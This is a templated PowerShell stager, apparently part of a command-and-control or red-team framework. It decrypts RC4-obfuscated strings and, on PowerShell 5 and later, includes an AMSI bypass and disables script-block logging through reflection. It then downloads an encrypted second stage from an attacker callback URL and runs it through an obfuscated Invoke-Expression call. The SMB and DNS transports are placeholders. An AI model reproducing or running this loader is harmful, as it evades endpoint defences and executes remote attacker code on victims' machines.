${{symbol_name("CALLBACK_URL")}} = "{{callback_url}}"
${{symbol_name("KEY")}} = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")

{% include "powershell/rc4.ps1" %}


function {{symbol_name("Decrypt-String")}} {
    param(
        [System.String]$string
  	)
    $result = [System.Convert]::FromBase64String($string)
    $result = {{symbol_name("Decrypt-Code")}} $result ${{symbol_name("KEY")}}
    $result = [System.Text.Encoding]::UTF8.GetString($result)
    $result
}

{% for s in strings %}
$string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s}}"
{% endfor %}

if ($PSVersionTable.PSVersion.Major -ge 5) {
    {% include "powershell/am0nsec-amsi-bypass.ps1" %}

    {# Disable Logging #}
    $settings = [Ref].Assembly.GetType($string2).GetField($string3,$string4).GetValue($null);
    $settings[$string5] = @{}
    $settings[$string5].Add($string6, "0")
}


{% if transport in ['http', 'https'] %}
    $WebClient = $K{# defined in the launcher #}
    function {{symbol_name("Transport-String")}} {
        return {{symbol_name("Decrypt-String")}} ($WebClient.DownloadString(${{symbol_name("CALLBACK_URL")}}+'{{stage2}}'))
}
{% elif transport == 'smb' %}
    {# TODO #}
{% elif transport == 'dns' %}
    {# TODO #}
{% endif %}

$code = {{symbol_name("Transport-String")}}

{#clever obfuscation#}
& (gcm i*k`e-e*n) $code
{{exec_clipboard_entry}}
